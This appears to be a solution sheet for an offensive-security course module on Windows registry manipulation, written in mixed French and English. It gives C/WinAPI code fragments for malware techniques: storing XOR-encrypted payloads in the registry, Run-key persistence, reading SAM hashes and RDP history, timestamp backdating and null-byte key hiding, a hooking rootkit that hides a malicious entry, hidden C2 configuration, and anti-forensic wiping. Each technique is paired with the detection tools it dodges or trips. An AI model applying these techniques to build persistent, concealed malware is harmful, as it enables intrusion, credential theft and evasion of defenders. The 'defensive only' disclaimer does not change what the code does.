SOLUTIONS - MODULE 35 : REGISTRY MANIPULATION

⚠️ AVERTISSEMENT : Techniques pour compréhension défensive uniquement.

SOLUTION 1 : HIDE ENCRYPTED PAYLOAD

XOR encryption + registry storage :
BYTE payload[] = {0x90, 0x90, 0x90, 0xC3};
BYTE key = 0xAA;
for (int i = 0; i < sizeof(payload); i++) payload[i] ^= key;

RegCreateKeyExA(HKCU, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion", ...);
char guid[64];
sprintf(guid, "{%08X-%04X-%04X}", rand(), rand(), rand());
RegSetValueExA(hkey, guid, 0, REG_BINARY, payload, sizeof(payload));

Read + decrypt :
RegQueryValueExA(hkey, guid, NULL, &type, buffer, &size);
for (int i = 0; i < size; i++) buffer[i] ^= 0xAA;

Bypass : Autoruns ne scanne pas toutes keys, seul forensics analyse trouve


SOLUTION 2 : PERSISTENCE MULTI-KEYS

Check si existe d'abord :
char path[MAX_PATH];
DWORD size = sizeof(path);
if (RegQueryValueExA(hkey, "AppName", NULL, NULL, path, &size) == ERROR_SUCCESS) {
    // Déjà installé
}

Multiples emplacements :
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
HKCU\...\RunOnce
HKLM\...\Run (si admin via IsUserAnAdmin())
HKCU\...\Explorer\User Shell Folders\Startup

Bypass : Autoruns détecte tout ça, mais pas si nom légitime + signature valide


SOLUTION 3 : REGISTRY DATA EXFILTRATION

SAM hashes (nécessite SYSTEM privileges) :
HKEY hkey;
RegOpenKeyExA(HKLM, "SAM\\SAM\\Domains\\Account\\Users", 0, KEY_READ, &hkey);
// Accès refusé sans SYSTEM

RDP history :
RegOpenKeyExA(HKCU, "Software\\Microsoft\\Terminal Server Client\\Servers", ...);
// Enumerate toutes subkeys = hostnames connectés

Run keys enumeration :
RegEnumValueA(hkey, index, valueName, &nameSize, ...);
fprintf(output, "%s = %s\n", valueName, data);

Export to file :
FILE* f = fopen("C:\\temp\\regdump.txt", "w");

Bypass : EDR détecte accès SAM, Process Monitor voit RegOpenKey


SOLUTION 4 : STEALTH REGISTRY MODIFICATION

Timestamp manipulation :
HANDLE hFile = CreateFileA("\\\\.\\C:\\Windows\\System32\\config\\SOFTWARE", ...);
FILETIME ft;
GetSystemTimeAsFileTime(&ft);
// Modifier ft pour backdating
SetFileTime(hFile, &ft, NULL, NULL);

Null byte key hiding :
char keyname[] = "Legit\x00Hidden";  // Windows affiche "Legit" seulement
RegCreateKeyExA(hkey, keyname, ...);

Batch operations (minimal writes) :
RegCreateKeyExA(..., &hkey, NULL);
RegSetValueExA(hkey, "val1", ...);
RegSetValueExA(hkey, "val2", ...);
RegSetValueExA(hkey, "val3", ...);
RegCloseKey(hkey);  // Flush une fois

Bypass : Forensics tools voient vraie structure, heuristics détectent null bytes


SOLUTION 5 : REGISTRY ROOTKIT HIDING

Hook RegQueryValueEx (usermode) :
typedef LONG (WINAPI *RegQueryValueExA_t)(...);
RegQueryValueExA_t OriginalRegQuery = GetProcAddress(...);

LONG WINAPI HookedRegQuery(...) {
    LONG ret = OriginalRegQuery(...);
    if (strcmp(lpValueName, "MaliciousEntry") == 0) {
        return ERROR_FILE_NOT_FOUND;  // Hide notre entrée
    }
    return ret;
}
// Détour/hook installation

Kernel-level (driver) :
ObRegisterCallbacks pour filter registry operations
Return STATUS_OBJECT_NAME_NOT_FOUND pour nos keys

Bypass : Kernel debugger, direct hive file parsing, comportement-based detection


SOLUTION 6 : C2 CONFIG IN REGISTRY

Encodage base64 :
char* ip = "192.168.1.100";
char b64[256];
base64_encode(ip, b64);  // "MTkyLjE2OC4xLjEwMA=="
RegSetValueExA(hkey, "UpdateServer", 0, REG_SZ, b64, strlen(b64));

DWORD port = 4444;
RegSetValueExA(hkey, "UpdatePort", 0, REG_DWORD, &port, sizeof(port));

BYTE aes_key[32] = {0x41, 0x42, ...};
RegSetValueExA(hkey, "CertHash", 0, REG_BINARY, aes_key, 32);

Read config :
RegQueryValueExA(hkey, "UpdateServer", NULL, NULL, b64, &size);
base64_decode(b64, ip);
RegQueryValueExA(hkey, "UpdatePort", NULL, NULL, &port, &size);

Bypass : Statique detection = encodé, runtime behavior analysis trouve C2


SOLUTION 7 : REGISTRY FORENSICS EVASION

RegDeleteKey ne wipe pas vraiment :
RegDeleteKeyA(hkey, "BadKey");
// Données still in slack space, récupérable avec FTK/EnCase

Vraiment wipe :
BYTE zeros[4096] = {0};
RegSetValueExA(hkey, "BadKey", 0, REG_BINARY, zeros, sizeof(zeros));
Sleep(100);
RegDeleteValueA(hkey, "BadKey");
RegDeleteKeyA(hkey, "ParentKey");

Transaction Registry (TxR) :
HANDLE hTrans = CreateTransaction(...);
RegCreateKeyTransactedA(HKCU, "Key", ..., hTrans, ...);
RegSetValueExA(...);
CommitTransaction(hTrans);  // Atomic, harder forensics

USN Journal :
// Nécessite driver kernel pour manipuler $UsnJrnl

Bypass : Forensics timeline analysis, VSS snapshots, transaction logs


SOLUTION 8 : CROSS-PROCESS REGISTRY IPC

Process A (sender) :
HANDLE hMutex = CreateMutexA(NULL, FALSE, "Global\\RegIPCMutex");
WaitForSingleObject(hMutex, INFINITE);

BYTE msg[] = "SECRET MESSAGE";
RegSetValueExA(hkey, "IPCChannel", 0, REG_BINARY, msg, sizeof(msg));

ReleaseMutex(hMutex);

Process B (receiver) :
HANDLE hEvent = CreateEventA(NULL, FALSE, FALSE, NULL);
RegNotifyChangeKeyValue(hkey, FALSE, REG_NOTIFY_CHANGE_LAST_SET, hEvent, TRUE);

while (1) {
    WaitForSingleObject(hEvent, INFINITE);

    WaitForSingleObject(hMutex, INFINITE);
    BYTE buffer[256];
    DWORD size = sizeof(buffer);
    RegQueryValueExA(hkey, "IPCChannel", NULL, NULL, buffer, &size);

    // Process message
    RegDeleteValueA(hkey, "IPCChannel");  // Cleanup
    ReleaseMutex(hMutex);
}

Bypass : Process Monitor voit tout, Sysmon Event 13, named mutex visible


RÉFÉRENCES :
- "Practical Malware Analysis" Chapter 11 (Persistence)
- MITRE ATT&CK T1112 (Modify Registry)
- Emotet, TrickBot, Carberp analysis reports
- Windows Registry Forensics book
- RegRipper forensics tool
